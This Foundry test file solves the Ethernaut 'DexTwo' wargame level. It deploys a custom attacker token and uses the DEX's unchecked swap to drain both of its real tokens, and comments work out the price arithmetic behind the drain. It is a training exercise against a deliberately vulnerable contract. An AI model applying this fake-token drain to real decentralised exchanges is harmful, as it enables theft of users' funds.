// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/23-DexTwo/DexTwoFactory.sol";
import {DexTwoAttacker} from "../src/23-DexTwo/DexTwoAttacker.sol";
import "../src/Ethernaut.sol";

contract DexTwoTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testDexTwoHack() public {
        // Level setup
        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(dexTwoFactory);
        DexTwo ethernautDexTwo = DexTwo(payable(levelAddress));

        // Level attack
        address token1 = ethernautDexTwo.token1();
        address token2 = ethernautDexTwo.token2();
        
        // swapPrice = amountFrom * balanceTo / balanceFrom
        // If we want swapPrice == balanceTo, then => 
        // balanceTo = amountFrom * balanceTo / balanceFrom <=>
        // amountFrom = balanceFrom
        DexTwoAttacker attackerToken = new DexTwoAttacker();
        attackerToken.transfer(address(ethernautDexTwo), 1 ether);
        attackerToken.approve(address(ethernautDexTwo), attackerToken.balanceOf(eoaAddress));
        // drain token1
        ethernautDexTwo.swap(address(attackerToken), token1, attackerToken.balanceOf(address(ethernautDexTwo)));
        // drain token2
        ethernautDexTwo.swap(address(attackerToken), token2, attackerToken.balanceOf(address(ethernautDexTwo)));

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}